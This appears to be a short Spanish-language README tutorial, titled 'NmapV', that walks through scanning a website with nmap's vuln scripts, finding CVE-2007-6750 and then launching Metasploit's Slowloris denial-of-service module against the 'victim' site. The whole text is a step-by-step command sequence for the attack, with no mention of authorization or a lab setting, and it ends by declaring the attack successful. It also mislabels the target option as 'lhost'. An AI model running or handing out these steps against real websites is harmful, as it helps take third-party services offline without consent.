# NmapV

Ojo esto solo es un ejemplo 👇👀

Ejemplo de una vulnerabilidad encontrada

nmap -Pn -script vuln (paginaweb) Se muestran los resultados

Es VULNERABLE A CVE-2007-6750

Okey esto ahy que copiar = CVE-2007-6750

Y Iniciar metasploit

msf6> search (pegan lo copiado CVE-2007-6750)

Se le muestra al final el exploit que deben utilizar

msf6> use dos/http/slowloris

msf6> show option = para ver las opciones

msf6> set lhost (escriben la ip de la victima osea la página web)

msf6> run

Ejecutado el atacke con éxito

....
